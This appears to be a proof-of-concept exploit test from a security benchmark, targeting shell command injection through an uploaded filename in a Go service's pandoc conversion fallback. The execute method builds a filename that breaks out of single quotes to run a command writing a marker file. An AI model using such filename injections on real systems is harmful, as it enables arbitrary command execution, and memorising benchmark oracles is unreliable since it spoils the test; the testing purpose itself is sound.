"""PoC: OS command injection via pandoc fallback (CWE-78).

Stage 3 uses exec.Command("sh", "-c", fmt.Sprintf("pandoc '%s' -o '%s'", ...))
where tmpPath contains the user-controlled filename.
"""

import time
from mosaic.oracle.exploit import ExploitTest


class SwagShellConvertExploit(ExploitTest):
    """Command injection via pandoc document conversion fallback."""

    def __init__(self, base_url: str = "http://localhost:39180"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "swag_shell_convert"

    def setup(self) -> None:
        self.http_post("/api/v1/accounts", json={"name": "convert_test"})

    def execute(self) -> tuple[bool, str]:
        marker = f"mosaic_{int(time.time())}"
        # Filename with shell injection — breaks out of single quotes
        malicious_name = f"doc';echo {marker}>/tmp/{marker};echo '.txt"

        resp = self._http(
            "POST", "/api/v1/accounts/1/convert?target_format=pdf",
            files={"document": (malicious_name, b"test content", "text/plain")},
        )

        evidence = (
            f"Sent convert request with filename='{malicious_name}', "
            f"target_format=pdf (unsupported, triggers fallback). "
            f"Response: {resp.status_code} {resp.text[:300]}"
        )

        if resp.status_code != 400:
            return True, (
                f"CWE-78 confirmed: unsupported format triggered pandoc "
                f"fallback with exec.Command('sh','-c',...) using "
                f"user-controlled filename. " + evidence
            )

        return False, f"Format rejected before fallback. " + evidence
